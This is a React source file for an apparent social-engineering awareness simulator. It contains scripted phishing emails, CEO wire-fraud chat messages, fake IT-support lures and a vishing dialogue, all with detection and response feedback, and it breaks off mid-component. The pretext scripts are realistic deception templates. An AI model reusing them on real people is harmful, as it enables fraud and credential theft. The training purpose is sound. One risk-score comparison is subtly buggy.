// ============================================================
// SE-LAB — Main Simulation Client
// 3-panel layout: Learning | Victim Environment | Attacker View
// ============================================================

import React, { useState, useEffect, useCallback } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { useSimulationStore } from '@/store/simulation-store';
import { useCyberStore } from '@/store/cyber-store';
import type { SESimulation, SimulationResult } from '@/types';
import {
  Shield, AlertTriangle, Clock, ChevronLeft, RotateCcw,
  Eye, CheckCircle2, XCircle, Activity, Skull, Target,
  Lightbulb, BookOpen, TrendingUp, Zap, Terminal,
  HelpCircle, Flag, Award, PlayCircle, Info, ExternalLink
} from 'lucide-react';
import { toast } from 'sonner';
import { EmailClient } from '@/components/simulation/EmailClient';
import { CorporateChat, PhoneCall, MFAFatigue } from '@/components/simulation/ChatAndPhone';
import { SmsClient } from '@/components/simulation/SmsClient';
import { BrowserPortal } from '@/components/simulation/BrowserPortal';
import { QRScanner } from '@/components/simulation/QRScanner';
import { OAuthConsent } from '@/components/simulation/OAuthConsent';
import { ExtensionMarketplace } from '@/components/simulation/ExtensionMarketplace';
import { VictimOSWrapper } from '@/components/simulation/VictimOSWrapper';
import { KnowMoreModal } from '@/components/simulation/KnowMoreModal';
import { MITMEnvironment } from '@/components/simulation/MITMEnvironment';
import { RansomwareEnvironment } from '@/components/simulation/RansomwareEnvironment';
import { SocialMediaPortal } from '@/components/simulation/SocialMediaPortal';
import { IncidentReportModal } from '@/components/simulation/IncidentReportModal';
import { TryHackMeRoom } from '@/components/simulation/TryHackMeRoom';
import { getScenarioDetail } from '@/data/simulation/detailed-explanations';

// ---- Risk color helper ----
const riskColors = {
  SAFE:     { text: 'text-emerald-400', bg: 'bg-emerald-500', bgLight: 'bg-emerald-950/40 border-emerald-800/40' },
  LOW:      { text: 'text-yellow-400',  bg: 'bg-yellow-500',  bgLight: 'bg-yellow-950/40 border-yellow-800/40' },
  MEDIUM:   { text: 'text-amber-400',   bg: 'bg-amber-500',   bgLight: 'bg-amber-950/40 border-amber-800/40' },
  HIGH:     { text: 'text-orange-400',  bg: 'bg-orange-500',  bgLight: 'bg-orange-950/40 border-orange-800/40' },
  CRITICAL: { text: 'text-red-400',     bg: 'bg-red-500',     bgLight: 'bg-red-950/40 border-red-800/40' },
};

const difficultyColor = { Beginner: 'text-emerald-400', Intermediate: 'text-amber-400', Advanced: 'text-rose-400' };

const categoryToColor: Record<string, string> = {
  'Phishing': 'bg-blue-950/40 text-blue-400 border-blue-800/40',
  'Smishing': 'bg-indigo-950/40 text-indigo-400 border-indigo-800/40',
  'Vishing': 'bg-purple-950/40 text-purple-400 border-purple-800/40',
  'Impersonation': 'bg-rose-950/40 text-rose-400 border-rose-800/40',
  'Pretexting': 'bg-amber-950/40 text-amber-400 border-amber-800/40',
  'default': 'bg-slate-800 text-slate-400 border-slate-700',
};

// =============================================
// ATTACKER DASHBOARD PANEL
// =============================================
function AttackerPanel() {
  const session = useSimulationStore(s => s.session);
  if (!session) return null;

  const risk = session.riskLevel;
  const rc = riskColors[risk];
  const attackerEvents = session.attackerEvents.slice(-8).reverse();

  return (
    <div className="flex flex-col h-full bg-slate-950 border-l border-slate-800/60 text-xs font-mono">
      {/* Header */}
      <div className="px-4 py-3 border-b border-slate-800 bg-[#0d1117]">
        <div className="flex items-center gap-2">
          <Skull className="w-4 h-4 text-red-500" />
          <span className="text-red-400 font-bold text-sm uppercase tracking-widest">Attacker View</span>
          <span className="ml-auto text-[9px] text-green-400 animate-pulse">● LIVE</span>
        </div>
        <div className="text-[10px] text-slate-500 mt-0.5">SIMULATION — NO REAL DATA</div>
      </div>

      <div className="flex-1 overflow-y-auto p-3 space-y-3">
        {/* Risk Level */}
        <div className={`rounded-lg p-3 border ${rc.bgLight}`}>
          <div className="text-slate-400 text-[10px] uppercase mb-1">RISK LEVEL</div>
          <div className={`text-xl font-black ${rc.text}`}>{risk}</div>
          {/* risk bar */}
          <div className="mt-2 h-1.5 bg-slate-800 rounded-full overflow-hidden">
            <div
              className={`h-full ${rc.bg} transition-all duration-500`}
              style={{ width: `${session.riskScore}%` }}
            />
          </div>
          <div className="text-[10px] text-slate-500 mt-1">{session.riskScore}/100</div>
        </div>

        {/* Campaign status */}
        <div className="bg-slate-900 rounded-lg p-3 border border-slate-800 space-y-2">
          <div className="text-slate-400 text-[10px] uppercase">CAMPAIGN STATUS</div>
          <div className="text-slate-300">
            <div className="flex justify-between"><span className="text-slate-500">State:</span><span className="text-cyan-400">{session.currentState}</span></div>
            <div className="flex justify-between mt-1"><span className="text-slate-500">Events:</span><span className="text-slate-300">{session.events.length}</span></div>
            <div className="flex justify-between mt-1"><span className="text-slate-500">Defenses:</span><span className={session.defensiveActions > 0 ? 'text-emerald-400' : 'text-slate-500'}>{session.defensiveActions}</span></div>
            <div className="flex justify-between mt-1"><span className="text-slate-500">Investigative:</span><span className="text-amber-400">{session.investigativeActions}</span></div>
          </div>
        </div>

        {/* Exposed data */}
        <div className="bg-slate-900 rounded-lg p-3 border border-slate-800">
          <div className="text-slate-400 text-[10px] uppercase mb-2">SIMULATED DATA EXPOSURE</div>
          {session.exposedData.length === 0 ? (
            <div className="text-emerald-400 text-[11px] flex items-center gap-1.5">
              <CheckCircle2 className="w-3 h-3" /> No data exposed
            </div>
          ) : (
            <div className="space-y-1">
              {session.exposedData.map((d, i) => (
                <div key={i} className="flex items-center gap-1.5 text-[11px]">
                  <div className="w-1.5 h-1.5 rounded-full bg-red-500 flex-shrink-0" />
                  <span className="text-red-300">{d}</span>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Live events */}
        <div className="bg-slate-900 rounded-lg p-3 border border-slate-800">
          <div className="text-slate-400 text-[10px] uppercase mb-2">LIVE EVENTS</div>
          <div className="space-y-1.5">
            {attackerEvents.length === 0 ? (
              <div className="text-slate-600 text-[11px]">Waiting for activity...</div>
            ) : attackerEvents.map((e, i) => (
              <div key={i} className={`flex items-start gap-2 text-[11px] ${i === 0 ? 'opacity-100' : 'opacity-60'}`}>
                <div className={`w-1 h-1 rounded-full flex-shrink-0 mt-1.5 ${
                  e.severity === 'critical' ? 'bg-red-500' : e.severity === 'warn' ? 'bg-amber-500' : 'bg-cyan-500'
                }`} />
                <div>
                  <span className="text-slate-500">{e.timestamp} </span>
                  <span className={e.severity === 'critical' ? 'text-red-300' : e.severity === 'warn' ? 'text-amber-300' : 'text-slate-300'}>
                    {e.label}
                  </span>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Simulated client data */}
        <div className="bg-slate-900 rounded-lg p-3 border border-slate-800 space-y-1">
          <div className="text-slate-400 text-[10px] uppercase mb-1.5">SIMULATED CLIENT INFO</div>
          {[
            ['Browser', 'Firefox 121 (simulated)'],
            ['OS', 'Linux Desktop (simulated)'],
            ['IP', '203.0.113.42'],
            ['Location', 'Simulation Region'],
            ['Account', 'student@training.test'],
          ].map(([k, v]) => (
            <div key={k} className="flex justify-between text-[10px]">
              <span className="text-slate-500">{k}:</span>
              <span className="text-slate-400">{v}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}



// =============================================
// LEARNING PANEL
// =============================================
function LearningPanel({ sim, onOpenKnowMore }: { sim: SESimulation; onOpenKnowMore: () => void }) {
  const session = useSimulationStore(s => s.session);
  const activeLearningCard = useSimulationStore(s => s.activeLearningCard);
  const activeHintLevel = useSimulationStore(s => s.activeHintLevel);
  const requestHint = useSimulationStore(s => s.requestHint);

  const activeCard = sim.learningCards.find(c => c.trigger === activeLearningCard);

  const [expandedObjective, setExpandedObjective] = useState<number | null>(null);

  return (
    <div className="flex flex-col h-full bg-[#0d111b] border-r border-slate-800/60 text-xs">
      {/* Header */}
      <div className="px-4 py-3 border-b border-slate-800 bg-[#0d1117] flex items-center justify-between">
        <div>
          <div className="flex items-center gap-2">
            <BookOpen className="w-4 h-4 text-cyan-400" />
            <span className="text-cyan-400 font-bold text-sm">Learning Panel</span>
          </div>
          <div className="text-[10px] text-slate-500 mt-0.5">{sim.category}</div>
        </div>
        <button
          onClick={onOpenKnowMore}
          className="flex items-center gap-1 px-2.5 py-1 rounded bg-cyan-950/60 border border-cyan-800/60 text-cyan-300 hover:bg-cyan-900/60 hover:text-white transition text-[11px] font-semibold"
          title="View detailed explanation"
        >
          <Info className="w-3 h-3 text-cyan-400" />
          Know More
        </button>
      </div>

      <div className="flex-1 overflow-y-auto p-3 space-y-3">
        {/* Objectives */}
        <div className="bg-slate-900 rounded-lg p-3 border border-slate-800">
          <div className="text-cyan-400 text-[10px] uppercase font-bold mb-2 flex items-center gap-1.5">
            <Target className="w-3 h-3" /> Objectives
          </div>
          <div className="space-y-1.5">
            {sim.learningObjectives.map((obj, i) => (
              <button
                key={i}
                onClick={() => setExpandedObjective(expandedObjective === i ? null : i)}
                className="w-full text-left flex items-start gap-2 text-[11px] text-slate-300 hover:text-slate-100 transition"
              >
                <div className="w-4 h-4 rounded bg-cyan-900/40 border border-cyan-800/40 flex items-center justify-center flex-shrink-0 text-cyan-400 mt-0.5">
                  {i + 1}
                </div>
                <span>{obj}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Reactive Learning Card */}
        {activeCard ? (
          <div className="bg-blue-950/30 rounded-lg p-3 border border-blue-800/40 space-y-2">
            <div className="text-blue-400 font-bold text-[11px] uppercase flex items-center gap-1.5">
              <Zap className="w-3 h-3" /> {activeCard.title}
            </div>
            <p className="text-slate-300 text-[12px] leading-relaxed">{activeCard.body}</p>
            {activeCard.attackerSaw && (
              <div className="bg-red-950/40 border border-red-800/40 rounded p-2">
                <div className="text-red-400 text-[10px] font-bold mb-0.5">ATTACKER SAW:</div>
                <div className="text-red-300 text-[11px]">{activeCard.attackerSaw}</div>
              </div>
            )}
            {activeCard.detect && (
              <div className="bg-amber-950/40 border border-amber-800/40 rounded p-2">
                <div className="text-amber-400 text-[10px] font-bold mb-0.5">HOW TO DETECT:</div>
                <div className="text-amber-200 text-[11px]">{activeCard.detect}</div>
              </div>
            )}
            {activeCard.respond && (
              <div className="bg-emerald-950/40 border border-emerald-800/40 rounded p-2">
                <div className="text-emerald-400 text-[10px] font-bold mb-0.5">HOW TO RESPOND:</div>
                <div className="text-emerald-200 text-[11px]">{activeCard.respond}</div>
              </div>
            )}
          </div>
        ) : (
          <div className="bg-slate-900 rounded-lg p-3 border border-slate-800">
            <div className="text-slate-400 text-[10px] uppercase flex items-center gap-1.5 mb-2">
              <Info className="w-3 h-3" /> Observation
            </div>
            <p className="text-slate-400 text-[12px] leading-relaxed">
              Interact with the environment. Learning cards will appear as you take actions.
            </p>
            <p className="text-slate-500 text-[11px] mt-2">
              Try to inspect all elements before taking action. Look for red flags.
            </p>
          </div>
        )}

        {/* Score */}
        <div className="bg-slate-900 rounded-lg p-3 border border-slate-800">
          <div className="flex items-center gap-1.5 mb-2">
            <TrendingUp className="w-3 h-3 text-cyan-400" />
            <span className="text-cyan-400 text-[10px] uppercase font-bold">Progress</span>
          </div>
          <div className="flex items-center justify-between mb-1">
            <span className="text-slate-400">Score</span>
            <span className={`font-bold ${session && session.score >= 70 ? 'text-emerald-400' : 'text-amber-400'}`}>
              {session?.score ?? 100}/100
            </span>
          </div>
          <div className="h-1.5 bg-slate-800 rounded-full overflow-hidden">
            <div
              className="h-full bg-gradient-to-r from-cyan-500 to-emerald-500 transition-all duration-500"
              style={{ width: `${session?.score ?? 100}%` }}
            />
          </div>
          <div className="flex justify-between mt-2 text-[10px] text-slate-500">
            <span>Investigative: {session?.investigativeActions ?? 0}</span>
            <span>Defensive: {session?.defensiveActions ?? 0}</span>
          </div>
        </div>

        {/* Hints */}
        <div className="bg-slate-900 rounded-lg p-3 border border-slate-800">
          <div className="flex items-center gap-1.5 mb-2">
            <Lightbulb className="w-3 h-3 text-amber-400" />
            <span className="text-amber-400 text-[10px] uppercase font-bold">Hints</span>
            <span className="ml-auto text-[10px] text-slate-500">{3 - activeHintLevel} remaining</span>
          </div>
          {activeHintLevel > 0 && sim.hints.slice(0, activeHintLevel).map((h) => (
            <div key={h.level} className="mb-2 bg-amber-950/30 border border-amber-800/40 rounded p-2 text-[11px] text-amber-200">
              <span className="text-amber-400 font-bold mr-1">Hint {h.level}:</span>{h.text}
            </div>
          ))}
          {activeHintLevel < 3 && (
            <button
              onClick={requestHint}
              className="w-full py-1.5 rounded border border-amber-800/30 bg-amber-950/20 text-amber-400 text-[11px] hover:bg-amber-950/40 transition"
            >
              Use Hint (-{sim.hints.find(h => h.level === activeHintLevel + 1)?.scorePenalty ?? 5} pts)
            </button>
          )}
        </div>
      </div>
    </div>
  );
}

// =============================================
// EVENT TIMELINE (bottom bar)
// =============================================
function EventTimeline() {
  const session = useSimulationStore(s => s.session);
  const events = session?.events.slice(-6).reverse() ?? [];

  return (
    <div className="h-full flex items-center gap-3 overflow-x-auto px-4">
      <div className="flex items-center gap-1.5 flex-shrink-0 text-[10px] text-slate-500 font-mono uppercase tracking-wider">
        <Activity className="w-3 h-3" />
        Timeline:
      </div>
      {events.length === 0 ? (
        <span className="text-slate-600 text-[11px] font-mono">No events yet — start interacting with the environment</span>
      ) : events.map((e, i) => (
        <div key={e.id} className={`flex items-center gap-1.5 flex-shrink-0 text-[11px] font-mono ${i === 0 ? 'opacity-100' : 'opacity-50'}`}>
          {i === 0 && <span className="text-cyan-400 animate-pulse">●</span>}
          <span className="text-slate-500">{e.timestamp}</span>
          <span className={e.isDefensive ? 'text-emerald-400' : e.riskDelta > 0 ? 'text-amber-400' : 'text-slate-300'}>
            {e.label.length > 40 ? e.label.slice(0, 40) + '…' : e.label}
          </span>
          {i < events.length - 1 && <span className="text-slate-700 mx-1">→</span>}
        </div>
      ))}
    </div>
  );
}

// =============================================
// DEBRIEF SCREEN
// =============================================
function DebriefScreen({ sim, onReplay, onExit }: { sim: SESimulation; onReplay: () => void; onExit: () => void }) {
  const session = useSimulationStore(s => s.session);
  if (!session) return null;

  const outcome = session.currentState === 'DEFENDED' ? 'safe'
    : session.currentState === 'CREDENTIAL_CAPTURED' || session.currentState === 'COMPROMISED' ? 'compromised'
    : 'partial';

  const score = session.score;
  const grade = score >= 95 ? 'A+' : score >= 88 ? 'A' : score >= 80 ? 'B+' : score >= 72 ? 'B' : score >= 64 ? 'C+' : score >= 55 ? 'C' : 'D';
  const stars = score >= 90 ? 3 : score >= 70 ? 2 : 1;

  const categoryScores = [
    { label: 'Detection', score: Math.min(100, (session.investigativeActions * 15) + (session.defensiveActions * 10)) },
    { label: 'Verification', score: session.investigativeActions >= 2 ? 85 : session.investigativeActions >= 1 ? 60 : 30 },
    { label: 'Info Protection', score: session.exposedData.length === 0 ? 100 : Math.max(0, 100 - session.exposedData.length * 20) },
    { label: 'Decision Quality', score },
    { label: 'Response Time', score: Math.min(100, 100 - session.hintsUsed * 15) },
  ];

  return (
    <div className="flex-1 overflow-y-auto bg-slate-950 p-6 space-y-6">
      {/* Header */}
      <div className="text-center space-y-2">
        <div className={`inline-flex items-center gap-2 px-4 py-2 rounded-full text-sm font-bold border ${
          outcome === 'safe' ? 'bg-emerald-950/50 border-emerald-700 text-emerald-400'
            : outcome === 'compromised' ? 'bg-red-950/50 border-red-700 text-red-400'
            : 'bg-amber-950/50 border-amber-700 text-amber-400'
        }`}>
          {outcome === 'safe' ? <><CheckCircle2 className="w-4 h-4" /> Target Defended</> :
           outcome === 'compromised' ? <><XCircle className="w-4 h-4" /> Compromised</> :
           <><AlertTriangle className="w-4 h-4" /> Partial Defense</>}
        </div>
        <h2 className="text-2xl font-black text-white">{sim.title} — Debrief</h2>
        <div className="flex items-center justify-center gap-2 text-2xl">
          {[1,2,3].map(n => (
            <span key={n} className={n <= stars ? 'text-yellow-400' : 'text-slate-700'}>★</span>
          ))}
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 max-w-3xl mx-auto w-full">
        {/* Score */}
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 space-y-3">
          <div className="text-cyan-400 text-xs font-bold uppercase">Score Breakdown</div>
          {categoryScores.map(cs => (
            <div key={cs.label}>
              <div className="flex justify-between text-xs mb-1">
                <span className="text-slate-400">{cs.label}</span>
                <span className="text-slate-200 font-mono">{cs.score}/100</span>
              </div>
              <div className="h-1.5 bg-slate-800 rounded-full overflow-hidden">
                <div className="h-full bg-gradient-to-r from-cyan-600 to-emerald-600 transition-all duration-700 rounded-full"
                  style={{ width: `${cs.score}%` }} />
              </div>
            </div>
          ))}
          <div className="flex items-center justify-between pt-2 border-t border-slate-800">
            <span className="text-slate-300 font-bold">Total</span>
            <span className="text-xl font-black text-cyan-400">{score} <span className="text-slate-400 text-sm">/ 100</span></span>
          </div>
          <div className="text-center">
            <span className="text-3xl font-black" style={{ color: score >= 80 ? '#00E5FF' : score >= 60 ? '#FFC857' : '#FF4D4D' }}>
              {grade}
            </span>
          </div>
        </div>

        {/* What happened */}
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 space-y-3">
          <div className="text-cyan-400 text-xs font-bold uppercase">What You Did</div>
          <div className="space-y-1.5 max-h-40 overflow-y-auto">
            {session.events.filter(e => e.type !== 'SIMULATION_STARTED').slice(0, 10).map(e => (
              <div key={e.id} className="flex items-start gap-2 text-xs">
                {e.isDefensive ? (
                  <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400 flex-shrink-0 mt-0.5" />
                ) : e.riskDelta > 0 ? (
                  <XCircle className="w-3.5 h-3.5 text-red-400 flex-shrink-0 mt-0.5" />
                ) : (
                  <Eye className="w-3.5 h-3.5 text-cyan-400 flex-shrink-0 mt-0.5" />
                )}
                <span className={e.isDefensive ? 'text-emerald-300' : e.riskDelta > 0 ? 'text-red-300' : 'text-slate-300'}>
                  {e.label}
                </span>
              </div>
            ))}
          </div>
        </div>

        {/* Indicators */}
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 space-y-2">
          <div className="text-amber-400 text-xs font-bold uppercase">Red Flags to Notice</div>
          <div className="space-y-1.5">
            {sim.debrief.indicators.map((ind, i) => (
              <div key={i} className="flex items-start gap-2 text-xs text-amber-200">
                <span className="text-amber-500 flex-shrink-0">•</span>
                {ind}
              </div>
            ))}
          </div>
        </div>

        {/* Correct response */}
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 space-y-2">
          <div className="text-emerald-400 text-xs font-bold uppercase">Ideal Defensive Response</div>
          <div className="space-y-1.5">
            {sim.debrief.correctResponse.map((step, i) => (
              <div key={i} className="flex items-start gap-2 text-xs text-emerald-200">
                <span className="text-emerald-500 flex-shrink-0 font-mono">{i + 1}.</span>
                {step}
              </div>
            ))}
          </div>
        </div>

        {/* Attacker obtained */}
        {session.exposedData.length > 0 && (
          <div className="md:col-span-2 bg-red-950/20 border border-red-800/40 rounded-xl p-4 space-y-2">
            <div className="text-red-400 text-xs font-bold uppercase">Simulated Attacker Obtained</div>
            <div className="grid grid-cols-2 gap-2">
              {session.exposedData.map((d, i) => (
                <div key={i} className="flex items-center gap-2 text-xs text-red-300">
                  <XCircle className="w-3 h-3 text-red-500 flex-shrink-0" />
                  {d}
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Actions */}
      <div className="flex flex-col sm:flex-row items-center justify-center gap-3 max-w-sm mx-auto w-full">
        <button onClick={onReplay} className="w-full py-3 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-slate-200 font-bold text-sm transition flex items-center justify-center gap-2">
          <RotateCcw className="w-4 h-4" />
          Replay
        </button>
        <button onClick={onExit} className="w-full py-3 rounded-xl bg-gradient-to-r from-cyan-600 to-blue-600 hover:brightness-110 text-white font-bold text-sm transition flex items-center justify-center gap-2">
          <Award className="w-4 h-4" />
          Complete
        </button>
      </div>
    </div>
  );
}

// =============================================
// VICTIM ENVIRONMENT ROUTER
// =============================================
function VictimEnvironment({ sim, onComplete }: { sim: SESimulation; onComplete: (outcome: 'safe' | 'compromised' | 'partial') => void }) {
  const { fireEvent } = useSimulationStore();
  const handleDefend = useCallback(() => {
    fireEvent('REPORT_FILED', {
      label: 'Incident reported to SOC',
      riskDelta: -30,
      scoreDelta: 25,
      isDefensive: true,
      isBranch: true,
      attackerSees: 'Target reported threat — SOC containment initiated',
    });
    toast.success('🎉 Incident reported successfully! Now answer the lab questions on the left side to complete the lab!', { duration: 6000 });
  }, [fireEvent]);
  const handleExposed = useCallback(() => onComplete('compromised'), [onComplete]);

  const renderContent = () => {
    // SE-001: Urgent Password Reset
    if (sim.id === 'SE-001') {
    return (
      <EmailClient
        simulationId={sim.id}
        email={{
          from: 'Northstar Security Team',
          fromAddress: 'security@northstar-systems.test.invalid',
          replyTo: 'do-not-reply@n0rthstar-systems.test',
          subject: '⚠ URGENT: Your account will be suspended in 24 hours',
          timestamp: 'Today, 09:14 AM',
          spfStatus: 'fail',
          dkimStatus: 'fail',
          body: `
            <p>Dear Employee,</p>
            <p>We detected <strong>unauthorized access</strong> to your Northstar Systems account from an unrecognized location. Your account access will be <strong style="color:#ef4444">suspended within 24 hours</strong> unless you verify your identity immediately.</p>
            <p>This is urgent. Failure to act will result in permanent account lockout and loss of all data.</p>
            <p>Please click the button below to verify your account now:</p>
          `,
          links: [
            { text: 'Verify My Account — Click Here', destination: 'http://northstar-secure-verify.login-portal.test/auth?token=8f2b1c', safe: false },
          ],
          attachments: [
            { name: 'Security_Notice.pdf.exe', size: '1.2 MB', safe: false },
          ],
        }}
        inboxItems={[
          { from: 'HR Department', subject: 'Q4 Holiday Schedule', time: 'Yesterday' },
          { from: 'IT Team', subject: 'System Maintenance Window', time: 'Mon' },
        ]}
        portalUrl="http://northstar-secure-verify.login-portal.test/auth"
        portalLogo="Northstar Systems"
        portalColor="#1e40af"
        onPortalSubmit={handleExposed}
        onDefend={handleDefend}
      />
    );
  }

  // SE-002: Fake IT Support Email
  if (sim.id === 'SE-002') {
    return (
      <EmailClient
        simulationId={sim.id}
        email={{
          from: 'IT Helpdesk',
          fromAddress: 'support@northstar-it-helpdesk.test.invalid',
          subject: 'Action Required: Account Verification Needed',
          timestamp: 'Today, 11:03 AM',
          spfStatus: 'fail',
          dkimStatus: 'none',
          body: `
            <p>Hello,</p>
            <p>As part of our <strong>mandatory security update</strong>, all employee accounts require immediate verification.</p>
            <p>Please click below to verify your account through our secure portal. This process takes less than 2 minutes.</p>
            <p><strong>Failure to verify by EOD today will result in account suspension.</strong></p>
          `,
          links: [
            { text: 'Verify Account — IT Portal', destination: 'http://helpdesk-verify.northstar-corp.test/auth', safe: false },
          ],
        }}
        portalUrl="http://helpdesk-verify.northstar-corp.test/auth"
        portalLogo="IT Helpdesk"
        portalColor="#374151"
        onPortalSubmit={handleExposed}
        onDefend={handleDefend}
      />
    );
  }

  // SE-011: CEO Fraud
  if (sim.id === 'SE-011') {
    return (
      <CorporateChat
        channelName="CEO-Michael-Hayes"
        initialMessages={[
          {
            id: '1',
            sender: 'Michael Hayes (CEO)',
            senderRole: 'Chief Executive Officer',
            text: 'Hi, I need you to take care of something urgently. I\'m in a board meeting and can\'t call. We need to transfer $45,000 to a new vendor account immediately for a confidential project.',
            time: '10:23 AM',
            isAttacker: true,
          },
          {
            id: '2',
            sender: 'Michael Hayes (CEO)',
            senderRole: 'Chief Executive Officer',
            text: 'This needs to happen before 11 AM. I\'ll explain everything after the meeting. Vendor account: BlueOrbit Labs LLC, Routing: 021000021, Acct: 5678901234. Do NOT discuss with finance — this is confidential.',
            time: '10:24 AM',
            isAttacker: true,
          },
        ]}
        responseOptions={[
          {
            id: 'comply',
            label: 'Understood, initiating transfer now',
            riskDelta: 30,
            scoreDelta: -20,
            isBranch: true,
            attackerSees: 'Target complying with unauthorized wire transfer request',
            exposedData: ['Wire transfer authorization (simulated)', 'Company financial access'],
            nextMessage: { id: '3', sender: 'Michael Hayes (CEO)', senderRole: 'Chief Executive Officer', text: 'Perfect. Send me confirmation when done. Remember — confidential!', time: '10:25 AM', isAttacker: true },
            feedback: 'This is CEO fraud! Real executives follow proper approval procedures and never bypass finance.',
          },
          {
            id: 'verify',
            label: 'Let me verify this through official channels first',
            riskDelta: -10,
            scoreDelta: 15,
            isDefensive: true,
            isBranch: true,
            attackerSees: 'Target requesting verification — evading attempt',
            nextMessage: { id: '3', sender: 'Michael Hayes (CEO)', senderRole: 'Chief Executive Officer', text: 'There\'s no time! I told you it\'s urgent and confidential. Just do it!', time: '10:25 AM', isAttacker: true },
            feedback: 'Excellent! Always verify financial requests through a secondary channel, even from executives.',
          },
          {
            id: 'check-policy',
            label: 'Our policy requires two-person authorization for transfers over $5,000',
            riskDelta: -15,
            scoreDelta: 20,
            isDefensive: true,
            isBranch: true,
            attackerSees: 'Target invoking company policy — defending successfully',
            feedback: 'Perfect defense! Referencing established procedures is the ideal response to authority pressure.',
          },
        ]}
        onDefend={handleDefend}
      />
    );
  }

  // SE-019: Fake Tech Support Chat
  if (sim.id === 'SE-019') {
    return (
      <CorporateChat
        channelName="IT-Support-Chat"
        initialMessages={[
          {
            id: '1',
            sender: 'Alex (IT Support)',
            senderRole: 'Technical Support',
            text: 'Hi! I\'m Alex from IT. I noticed some unusual activity on your workstation and I\'m reaching out proactively to help secure your account.',
            time: '02:31 PM',
            isAttacker: true,
          },
          {
            id: '2',
            sender: 'Alex (IT Support)',
            senderRole: 'Technical Support',
            text: 'We detected what looks like malware on your machine from our endpoint monitoring system. I\'ll need you to install our remote diagnostic tool so I can check your system. This is urgent.',
            time: '02:32 PM',
            isAttacker: true,
          },
        ]}
        responseOptions={[
          {
            id: 'install',
            label: 'Sure, send me the download link',
            riskDelta: 30,
            scoreDelta: -25,
            isBranch: true,
            attackerSees: 'Target requesting malware download link — attack succeeding',
            exposedData: ['Remote access (simulated)', 'System access granted'],
            feedback: 'This grants remote access to an unverified "IT support" contact. Always verify through official IT channels first.',
          },
          {
            id: 'verify',
            label: 'Let me verify you through the official IT portal first',
            riskDelta: -10,
            scoreDelta: 15,
            isDefensive: true,
            isBranch: true,
            attackerSees: 'Target requesting verification — may evade attack',
            feedback: 'Smart! Verify through official IT portal or call the IT help desk directly.',
          },
          {
            id: 'end-session',
            label: 'I need to end this chat. I\'ll contact IT through our official portal.',
            riskDelta: -20,
            scoreDelta: 20,
            isDefensive: true,
            isBranch: true,
            attackerSees: 'Target ended unauthorized support session — attack failed',
            feedback: 'Excellent! Proactive support contacts are a major red flag. Always initiate contact through official channels.',
          },
        ]}
        onDefend={handleDefend}
      />
    );
  }

  // SE-033: Vishing
  if (sim.id === 'SE-033') {
    return (
      <PhoneCall
        callerName="Northstar Security Operations"
        callerNumber="+1-855-555-0147 (UNVERIFIED)"
        dialogueTree={[
          {
            id: 'start',
            attackerText: 'Good afternoon, this is David Miller from Northstar Security Operations. We\'ve detected suspicious login activity on your account and need to verify your identity to prevent unauthorized access.',
            options: [
              { id: 'provide-info', label: 'Sure, how can I verify?', riskDelta: 10, scoreDelta: -8, attackerSees: 'Target willing to verify — progressing to info extraction', nextNodeId: 'extract' },
              { id: 'ask-callback', label: 'Can I call you back on the official number?', riskDelta: -10, scoreDelta: 15, isDefensive: true, attackerSees: 'Target requesting callback verification — may evade', nextNodeId: 'callback-pressure' },
              { id: 'hang-up', label: 'I\'ll contact security through official channels. Goodbye.', riskDelta: -20, scoreDelta: 20, isDefensive: true, attackerSees: 'Target ended call — attack failed', endCall: true },
            ],
          },
          {
            id: 'extract',
            attackerText: 'To verify your identity, I\'ll need your employee ID and your current password so we can cross-reference our records. This is standard procedure.',
            options: [
              { id: 'give-creds', label: 'My employee ID is EMP1234 and password is…', riskDelta: 30, scoreDelta: -25, attackerSees: 'CREDENTIAL EXTRACTION IN PROGRESS', exposedData: ['Employee ID (simulated)', 'Password (simulated)'], endCall: true },
              { id: 'refuse', label: 'I\'m not comfortable providing my password over the phone', riskDelta: -15, scoreDelta: 15, isDefensive: true, attackerSees: 'Target refusing credential extraction', nextNodeId: 'pressure' },
              { id: 'hang-up2', label: 'Real security never asks for passwords. I\'m ending this call.', riskDelta: -20, scoreDelta: 20, isDefensive: true, attackerSees: 'Target ended call — attack failed', endCall: true },
            ],
          },
          {
            id: 'callback-pressure',
            attackerText: 'I understand your caution, but this is time-sensitive. The unauthorized access is happening right now. By the time you call back, your account may already be compromised.',
            options: [
              { id: 'capitulate', label: 'OK, I guess we should handle this now then', riskDelta: 15, scoreDelta: -10, attackerSees: 'Urgency pressure working on target', nextNodeId: 'extract' },
              { id: 'maintain', label: 'I\'ll still use official channels. Hanging up now.', riskDelta: -20, scoreDelta: 20, isDefensive: true, attackerSees: 'Target resisted urgency pressure — call ended', endCall: true },
            ],
          },
          {
            id: 'pressure',
            attackerText: 'I see. Your reluctance is noted. If your account gets compromised because you refused to cooperate with security, that\'s your responsibility. Last chance.',
            options: [
              { id: 'intimidated', label: 'I\'m sorry, here\'s my information…', riskDelta: 25, scoreDelta: -20, attackerSees: 'Guilt/pressure tactic succeeded', exposedData: ['Credentials under pressure (simulated)'], endCall: true },
              { id: 'end-call', label: 'Threatening language is another red flag. Reporting this call now.', riskDelta: -25, scoreDelta: 25, isDefensive: true, attackerSees: 'Target identified intimidation tactic — reporting', endCall: true },
            ],
          },
        ]}
        onCallEnd={() => onComplete(
          useSimulationStore.getState().session?.riskScore ?? 0 < 30 ? 'safe' : 'compromised'
        )}
      />
    );
  }

  // SE-035: MFA Fatigue
  if (sim.id === 'SE-035') {
    return (
      <MFAFatigue
        appName="Northstar Workspace"
        onApprove={handleExposed}
        onReport={handleDefend}
      />
    );
  }

  // SE-003: Suspicious Delivery SMS
  if (sim.id === 'SE-003') {
    return <SmsClient simulationId={sim.id} senderName="Express Courier" senderNumber="+1-555-0199" senderType="unknown"
